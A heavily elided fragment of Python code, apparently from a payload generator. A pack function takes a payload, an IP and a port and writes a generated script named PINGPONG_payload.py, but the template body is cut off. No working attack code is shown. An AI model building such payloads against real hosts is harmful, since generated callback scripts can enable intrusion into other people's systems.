...
def pack(payload, ip, port):
	...
	print("payload>[*]start to write .py file......")
	with open("./payload/PINGPONG_payload.py", "w+", encoding="utf8") as f:
		f.write(f""" 
# -*- coding:utf-8 -*-
# @FileName  :test.py
...
if __name__ == '__main__':
	...
	filename = basename("./payload/" + payload)
